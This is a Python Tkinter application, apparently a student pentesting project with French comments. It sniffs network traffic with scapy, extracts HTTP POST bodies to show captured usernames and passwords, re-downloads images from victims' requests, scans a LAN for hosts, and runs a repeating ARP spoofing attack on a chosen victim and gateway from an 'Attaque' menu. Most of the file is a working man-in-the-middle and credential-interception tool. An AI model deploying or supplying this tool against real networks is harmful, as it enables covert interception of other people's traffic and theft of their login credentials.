# -*- coding: utf-8 -*-
from tkinter import *
from tkinter.messagebox import *
from tkinter.filedialog import *
from tkinter.ttk import *
import PIL.Image
import PIL.ImageTk
from scapy.all import *
import netifaces
import urllib.request
import io

#Nos propres modules
import libs.list_colonnes
import libs.arp_spoof_win
import libs.network_device_scan
import libs.pkt_sniff

#Paramètres de base de la fenêtre
root = Tk()
root.geometry('1280x720')
root['bg']='white'
root.title('Sniffing et Pentesting')
# normalFont=('Consolas', 10)
# boldFont=('Consolas', 10, 'bold')

#Gestion des onglets
tabControl = Notebook(root) #Widget qui permet d'avoir plusieurs tabs
tab1 = Frame(tabControl)
tab2 = Frame(tabControl)
tabControl.add(tab1, text='Packet sniffer')
tabControl.add(tab2, text='Network Scan')

#---------- TAB1 ----------
updateRate=1 #A quel intervalle une fonction à répéter se répète en ms
value = StringVar(None, 'eth0') #Valeur par défaut de l'interface

#Initialisation des variables liées aux filtres
typFltr = StringVar()
valEntreeFiltre = StringVar()
eg = IntVar(None, 1) #On initialise à la valeur None

#Définition des fonctions nécessaires au sniffing de base

# ~ global numPic
# ~ numPic = 0
picLst = []
def emph(rawPkt):
	"""
	Arg : rawPkt, packet sous forme de bytes
	Action : Affiche les éléments transférés par un paquet HTTP POST dans un widget Text
	Return : rien
	"""
	#On doit créer un tuple de 1'élément pour que le packet soit lu de la bonne manière par pkt_sniff.pcktInfo()
	usablePkt=(rawPkt, )
	# dicInfo = libs.pkt_sniff.pcktInfo(usablePkt)

	for i in range(len(rawPkt)):
		#Au cas où il y a transfert d'infos personnels par http
		if rawPkt[i:i+4] == b'POST':
			# ~ print('POST')
			#On met en évidence les noms d'utilisateurs et mdp
			for i in range(len(rawPkt)-66):
				#Quand on trouve la séquence de fin d'http indiquant le header lié aux infos transférées
				if rawPkt[(66+i):(66+i+4)] == b'\x0d\x0a\x0d\x0a':
					place = i+66+4
			# print('POST')
			t2.insert(END, rawPkt[(place):]) #On affiche les infos trouvées dans un widget Text de l2
			t2.insert(END, '\n\n')
			t2.pack()
			break

        #Sniff d'images
		elif rawPkt[i:i+3] == b'GET':
			placeHost1 = 0
			placeHost2 = 1
			# ~ print("GET")
			for j in range(len(rawPkt)):
				if rawPkt[j:j+5] == b'Host:':
					# ~ print("HOST: OKOK")
					placeHost1 = j+5
			for j in range(len(rawPkt)):
				# ~ print(rawPkt[j:j+10])
				if rawPkt[j:j+10] == b'Connection':
					placeHost2 = j-2
			link1 = rawPkt[i+4:placeHost1-16]
			link2 = rawPkt[placeHost1+1:placeHost2]
			link = link2 + link1

			t2.insert(END, link)
			t2.insert(END, '\n\n')
			t2.pack()
			
			link = link.decode("utf-8")
			if link[-4:] == ".png" or link[-4:] == '.jpg' or link[-4:] == '.gif':
				# ~ global numPic
				
				# ~ with open("/root/Bureau/pics/img{}{}".format(numPic, link[-4:]), "wb") as f:
					# ~ f.write(urllib.request.urlopen("http://"+link).read())
					# ~ f.close()
					picRaw = urllib.request.urlopen("http://"+link).read()
					if picRaw not in picLst:
						picLst.append(picRaw)
			break
def saveImage():
	for i in range(len(picLst)):
		with open("/root/Bureau/pics/img{}{}".format(i+1, ".png"), "wb") as f:
			f.write(picLst[i])
			f.close()
			
def afficherImages():
	imagePopUp = Toplevel(root)
	savePicButton = Button(imagePopUp, text='Enregistrer les images', command=saveImage)
	savePicButton.pack()
	if len(picLst) > 0:
		imageLabelLst = []
		for rawData in picLst:
			im = PIL.Image.open(io.BytesIO(rawData))
			picWidget = PIL.ImageTk.PhotoImage(im)
			picLabel = Label(imagePopUp, image=picWidget)
			picLabel.image = picWidget
			picLabel.pack()

global pktLst
pktLst = []
global itera
itera = 0
def getSniffing(iface='eth0', typeFiltre=typFltr, vEntree=valEntreeFiltre, egalite=eg):
    """
	Arg : iface, l'interface réseau; typeFiltre, le paramètre à filtrer; vEntree, la valeur à filtrer;
		  egalite, on filtre l'égalité/inégalité (0 ou 1)
	Action : se répète pour récupérer les paquets de pkt_sniff.sniffer() un par un et les afficher, 
			 ainsi que les stocker dans pktLsts et mettre en évidence les paquets HTTP POST avec emph()
	Return : rien
    """
    global update
    global itera

    filtre = libs.pkt_sniff.filtrage(typeFiltre, vEntree, egalite) #Construction de la liste filtre
    sniff = libs.pkt_sniff.sniffer(iface, filtre) #On récupère le tuple du packet
    rawPkt = sniff[1] #Le packet sous forme de bytes
	
	#On met le packet raw dans une Frame ethernet scapy pour l'enregistrer dans un pcap
    pktLst.append(Ether(rawPkt))
    emph(rawPkt) #Mise en évidence des HTTP POST
	
	#Affichage du packet
    if sniff[0] and sniff[0] != 0:
        sniff[0][0]=itera+1
        tupleItem=tuple(sniff[0])
        lstbox.insert(tupleItem)
        lstbox.tree.yview_moveto(1)
    update = tab1.after(updateRate, getSniffing, iface) #Permet la répétition de la fonction
    itera+=1

def startSniff(iface, typeFiltre=typFltr, vEntree=valEntreeFiltre, egalite=eg):
    """
	Arg : iface, l'interface réseau; typeFiltre, le paramètre à filtrer; vEntree, la valeur à filtrer;
		  egalite, on filtre l'égalité/inégalité (0 ou 1)
    Action : fait appel à getSniffing(), est utilisée depuis le bouton "Débuter le sniffing"
	Return : rien
    """
    getSniffing(iface, typeFiltre=typFltr, vEntree=valEntreeFiltre, egalite=eg)

def stopSniff():
    """
    Arg : rien
	Action : Arrête la répétition de getSniffing()
	Return : rien
    """
    global update
    if update:
        tab1.after_cancel(update)
        update = None
        
def effacer():
    """
    Arg : rien
	Action : On efface tous les paquets sniffés jusque là et on réinitialise le compteur
	Return : rien
    """
    global pktLst
    global itera
    itera = 0
    lstbox.delete()
    pktLst = []

def onDoubleClick(event):
    """
    Arg : event, évènement lié au double clique sur un élément du TreeView
    Action : Ouvre une fenêtre pop-up d'infos plus complètes sur le paquet
    Return : rien
    """
    
    item = lstbox.tree.focus()
    number = lstbox.tree.item(item)['values'][0] - 1
    rawPkt = pktLst[number]
    popUp = Toplevel(root)
    popUp.title('Packet ' + str(number+1))
    textPkt = Text(popUp, bg='lightgray')
    textPkt.insert(END, rawPkt.show(dump=True) +'\n\n')
    textPkt.insert(END, hexdump(rawPkt, dump=True))
    textPkt.config(state=DISABLED)
    textPkt.pack(fill=BOTH, expand=YES)

#Gestion des frames et widgets

#Treeview
head = ['Num','Dst MAC', 'Src MAC', 'TTL', 'Prot', 'Src IP', 'Dst IP', 'Src Port', 'Dst Port', 'Flag']
infosListTuple = [] #Ligne vide pour le constructeur
lstbox = libs.list_colonnes.MultiColumnListbox(tab1, head, infosListTuple)
lstbox.tree.bind(("<Button-1>", onDoubleClick)) #On bind l'event au double clique gauche

#LabelFrame l2 des paramètres
l2 = LabelFrame(tab1, text="Paramètres")

frameParaSniff = Frame(l2)

buttonImages = Button(l2, text='Sniff des images', command=afficherImages)
buttonImages.pack()

#Boutons de base du sniffer
commencer = Button(frameParaSniff, text='Commencer le sniffing', command=lambda: startSniff(value.get(),))
stopButton = Button(frameParaSniff, text='Arrêter le sniffing', command=stopSniff)
delete = Button(frameParaSniff, text='Tout effacer', command=effacer)

#Choix de l'interface réseau
frameSniffIface = Frame(l2)
labelIface = Label(frameSniffIface, text='Sur quelle interface réseau sniffer ?')
ifaceLst = netifaces.interfaces()
buttonLst = []
for i in range(len(ifaceLst)):
    buttonLst.append(Radiobutton(frameSniffIface, text=ifaceLst[i], variable=value, value=ifaceLst[i]))

#Filtres:
frameLstFltr = Frame(l2)
labelFiltre= Label(frameLstFltr, text='Quel filtre voulez-vous appliquer ?')

lstFiltre = ('Pas de filtre', 'Pas de filtre','Any MAC', 'Src MAC','Dst MAC', 'Any IP', 'Src IP','Dst IP', 'Any Port', 'Src Port','Dst Port', 'Protocol')
# ~ typFltr.set(lstFiltre[0])
om = OptionMenu(frameLstFltr, typFltr, *lstFiltre)

egal = Radiobutton(frameLstFltr, text="Est égal à :", variable=eg, value=1)
pasEgal = Radiobutton(frameLstFltr, text="N'est pas égal à :", variable=eg, value=0)

valEntreeFiltre.set('172.0.0.1')
entree = Entry(l2, textvariable=valEntreeFiltre, width=20)

fresh = Button(l2, text='Rafraîchir') #Bouton pour  rafraîchir l'affichage avec les nouveaux filtres

#Infos d'un HTTP POST:
t2 = Text(l2)

#---------- TAB2 ----------

#Initialisation des variables liées aux paramètres du scan
scanIface = StringVar(None, 'eth0')
ipRange = StringVar(None, "172.22.22.0/24")

hostLst = []

global scanDone
scanDone = 0

def startScan(iface=scanIface.get(), iprange=ipRange.get()):
    """
	Arg : iface, l'interface, iprange, la range d'ip sous la forme "192.168.0.0/24"
	Action : Effectue le scan des membres network en affichant les couples MAC-IP, ce qui permet l'ARP Spoofing
	Return : rien
    """
    global scanDone
    
    lstboxScan.delete() #On supprime l'affichage du précédent scan
    privHosts = libs.network_device_scan.netDevScan(iface, iprange)
    for i in privHosts:
        hostLst.append(i)
    for i in privHosts:
        lstboxScan.insert(tuple(i))
    scanDone = 1 #Permet de dire qu'un scan a été réalisé

#TreeView
headScan = ['MAC', 'IP']
infosListTupleScan = []
lstboxScan = libs.list_colonnes.MultiColumnListbox(tab2, headScan, infosListTupleScan)
l4 = LabelFrame(tab2, text='Paramètres')

#Boutons de paramètrage du scan
startScanButton = Button(l4, text='Débuter le scan', command=lambda: startScan(iface=scanIface.get(), iprange=ipRange.get()))
scanLabelIface= Label(l4, text='Sur quelle interface réseau scanner ?') 
scanButtonLst = []

#Choix de l'interface
for i in range(len(ifaceLst)):
    scanButtonLst.append(Radiobutton(l4, text=ifaceLst[i], variable=scanIface, value=ifaceLst[i]))

scanLabelIpRange = Label(l4, text="Sur quelle range d'ip voulez-vous scanner ?")
entreeIpRange = Entry(l4, textvariable=ipRange, width=30)


#---------- Barre de menus -----------

menubar = Menu(root)

def alert():
    """
    Arg : rien
    Action : Affiche un message de Work In Progress
    Return : rien
    """
    showinfo("Sous-menu", "W.I.P")

def aPropos():
    """
    Arg : rien
    Action : Affiche le A propos du logiciel
    Return : rien
    """
    showinfo("A propos","Ebauche de logiciel de sniffing")

global f1
f1 = None #Variable qui va prendre la direction vers les fichiers à gérer
global file1

def getFile(typeFiltre=typFltr, vEntree=valEntreeFiltre, egalite=eg):
    """
    Arg : iface, l'interface réseau; typeFiltre, le paramètre à filtrer; vEntree, la valeur à filtrer;
		  egalite, on filtre l'égalité/inégalité (0 ou 1)
	Action : Récupère le nom de fichier à ouvrir dans une fenêtre du navigateur de fichiers et appel
			 openFile() pour ouvrir et afficher les paquets du fichier
	Return : rien
    """
    global f1
    f1 = askopenfilename(title="Ouvrir un fichier pcap", filetypes=[('Wireshark pcap file','.pcap')])
    openFile(fileName=f1, typeFiltre=typFltr, vEntree=valEntreeFiltre, egalite=eg)

def openFile(fileName=f1, typeFiltre=typFltr, vEntree=valEntreeFiltre, egalite=eg):
    """
    Arg : iface, l'interface réseau; typeFiltre, le paramètre à filtrer; vEntree, la valeur à filtrer;
		  egalite, on filtre l'égalité/inégalité (0 ou 1)
	Action : Ouvre le fichier pcap et en affiche les paquets
	Return : rien
    """
    fileList = rdpcap(fileName) #Lit un pcap et rend une packetList de scapy
    getSniffing() #Sert uniquement à pouvoir faire un reset
    stopSniff() #On arrête le sniffing en cours s'il y en a un
    lstbox.delete() #Effacement des anciens paquets
    filtre = libs.pkt_sniff.filtrage(typeFiltre, vEntree, egalite) #Créée la liste de filtrage

    global pktLst
    pktLst = []
    itera=1
    for packet in fileList:
        # Pour que le packet soit lu correctement par pcktShow() on a un tuple
        bytePkt = (raw(packet), )
        pktLst.append(Ether(raw(packet)))
        packetInfoLst = libs.pkt_sniff.pcktShow(bytePkt, filtre)
        packetInfoLst[0] = itera
        tupleItem = tuple(packetInfoLst)
       
        lstbox.insert(tupleItem)
        lstbox.tree.yview_moveto(1)
        emph(raw(packet))
        itera += 1

    #Si on veut rafraîchir les filtres
    fresh.configure(command=lambda: openFile(fileName=f1, typeFiltre=typFltr, vEntree=valEntreeFiltre, egalite=eg))
    fresh.pack()

    #Si on veut ré-enregistrer ce fichier
    global file1
    file1 = open(fileName, 'r')

f2 = None
def saveAs():
    """
    Arg : rien
	Action : Ouvre une fenêtre pour "enregistrer-sous" et fait appel à save() pour enregistrer dans le fichier
	Return : rien
	"""	
    #On crée et ouvre le fichier f2
    f2 = asksaveasfile(title='Enregistrer sous...', filetypes=[('Wireshark pcap file','.pcap')])
    if f2:
        save(f2)

def save(file1):
    """
    Arg : rien
	Action : Si on a un fichier en cours d'utilisation, écrit dans le fichier, sinon enregistre-sous
	Return : rien
	"""
    if file1:
        #On supprime l'ancien contenu
        file1.seek(0)
        file1.truncate()
        if pktLst[1]:
            pktdump = PcapWriter(file1.name, append=True, sync=True) #Objet Scapy qui permet d'écrire des .pcap
            for pkt in pktLst:
                pktdump.write(pkt)
    else:
        saveAs()

# Arp Spoofing
arpUpdateRate = 10000 #Les paquets sont envoyés chaque X ms

def arpSpoofingAccess(vMac, gMac, iface):
    """
    Arg : vMac, l'adresse mac de la victime; gMac, mac du gate; iface, l'interface
	Action : Si un scan a été effectué, envoie les paquets de spoof ARP en boucle jusqu'à
			 l'arrêt, sinon demande l'execution d'un scan
	Return : rien
    """
    global arpUpdate
    victim = None
    gate = None
	
	#Formatage des adresses MAC
    for i in hostLst:
        if i[0].replace(':','') == vMac.replace(':',''):
            victim = i
        elif i[0].replace(':','') == gMac.replace(':',''):
            gate = i
	
	#Si le scan reconnaît les cibles
    if victim and gate:
        victimTuple = (victim[0].replace(':',''), victim[1])
        gateTuple = (gate[0].replace(':',''), gate[1])
        libs.arp_spoof_win.arpSpoofing(victimTuple, gateTuple, iface)
        arpUpdate = root.after(arpUpdateRate, arpSpoofingAccess, vMac, gMac, iface)
    else: #Sinon
        showerror("Erreur de host", "Une ou les deux adresses MAC sélectionnées ne figurent pas dans le scan")
		
def arpStart(vMac, gMac, iface):
    """
    Arg : vMac, l'adresse mac de la victime; gMac, mac du gate; iface, l'interface
	Action : Lance la fonction arpSpoofingAccess()
	Return : rien
    """
    arpSpoofingAccess(vMac, gMac, iface)
	
def arpStop():
    """
    Arg : rien
	Action : Arrête la répétition de l'envoie de paquets d'ARP spoof
	Return : rien
    """
    global arpUpdate
    if arpUpdate:
        root.after_cancel(arpUpdate)
        update = None

def finWin(vMac, gMac, iface):
    """
	Arg : vMac, l'adresse mac de la victime; gMac, mac du gate; iface, l'interface
    Action : Fait appel à arpStart() et ferme la fenêtre pop-up
	Return : rien
    """
    global arpWin
    arpStart(vMac, gMac, iface)
    arpWin.destroy()

def arpInfos():
    """
	Arg : rien
    Action : Crée une fenêtre pop-up qui demande de remplir sur quelles Mac nous voulons procéder à l'attaque
	Return : rien
    """
    global scanDone
    if scanDone == 1: #Si un scan a été effectué
        global arpWin
        arpWin = Toplevel(root)
        arpWin.wm_title('Arp Spoofing')
        
		#MAC de la victime
        quelVMac = Label(arpWin, text='Quelles addresse Mac voulez-vous attaquer?')
        vMac = StringVar()
        vMac.set('80:fa:5b:25:4d:02')
        entreeVMac = Entry(arpWin, textvariable=vMac, width=30)

		#MAC du routeur
        quelGMac = Label(arpWin, text="Quelle est l'addressse Mac de l'AP ?")
        gMac = StringVar()
        gMac.set('70:5a:9e:34:30:2f')
        entreeGMac = Entry(arpWin, textvariable=gMac, width=30)
        
		#L'interface à utiliser
        arpLabelIface = Label(arpWin, text="Sur quelle interface réseau procéder à l'attaque ?")
        arpButtonLst = []
        arp_interface = StringVar(None, 'eth0')
        for i in range(len(ifaceLst)):
            arpButtonLst.append(Radiobutton(arpWin, text=ifaceLst[i], variable=arp_interface, value=ifaceLst[i]))

        arp_go_button= Button(arpWin, text='Ok', command=lambda: finWin(vMac.get(), gMac.get(), arp_interface.get()))

        quelVMac.pack()
        entreeVMac.pack()
        quelGMac.pack()
        entreeGMac.pack()
        om.pack()
        
        arpLabelIface.pack()
        for i in arpButtonLst:
            i.pack()
        arp_go_button.pack()
    else:
        showwarning('Scan réseau nécessaire',"Veuillez tout d'abord effectuer un scan de réseau pour en trouver les hôtes")

		
#Création des éléments de la barre des menus
menu1 = Menu(menubar, tearoff=0)
menu1.add_command(label="Enregistrer", command=lambda: save(file1))
menu1.add_command(label="Enregistrer sous", command=saveAs)
menu1.add_command(label="Ouvrir", command=getFile)
menu1.add_separator()
menu1.add_command(label="Quitter", command=root.quit)
menubar.add_cascade(label="Fichier", menu=menu1)

menu2 = Menu(menubar, tearoff=0)
menu2.add_command(label="Couper", command=alert)
menu2.add_command(label="Copier", command=alert)
menu2.add_command(label="Coller", command=alert)
menubar.add_cascade(label="Editer", menu=menu2)

menu3 = Menu(menubar, tearoff=0)
menu3.add_command(label="Arp Spoofing", command=arpInfos)
menu3.add_command(label="Stop", command=arpStop)
menubar.add_cascade(label="Attaque", menu=menu3)

menu4 = Menu(menubar, tearoff=0)
menu4.add_command(label="A propos", command=aPropos)
menubar.add_cascade(label="Aide", menu=menu4)

root.config(menu=menubar)

#---------- Package des widgets ----------
tabControl.pack(expand=1, fill='both')

#----- Pack TAB1 -----
l2.pack(side=RIGHT, expand=True, fill='both')
lstbox.tree.bind("<Double-1>", onDoubleClick)

frameParaSniff.pack(side=LEFT, padx=15, pady=15)
commencer.pack()
stopButton.pack()
delete.pack()

frameSniffIface.pack(side=LEFT, padx=15, pady=15)
labelIface.pack(padx=10,pady=10)
for i in range(len(netifaces.interfaces())):
    buttonLst[i].pack()

frameLstFltr.pack(side=LEFT, padx=15, pady=15)
labelFiltre.pack(side=TOP)
om.pack()

egal.pack()
pasEgal.pack()
entree.pack(side=LEFT)

#----- Pack TAB 2-----
l4.pack(side=RIGHT, expand=True, fill='both')

startScanButton.pack()
scanLabelIface.pack()
for i in scanButtonLst:
    i.pack()
scanLabelIpRange.pack()
entreeIpRange.pack

root.mainloop()
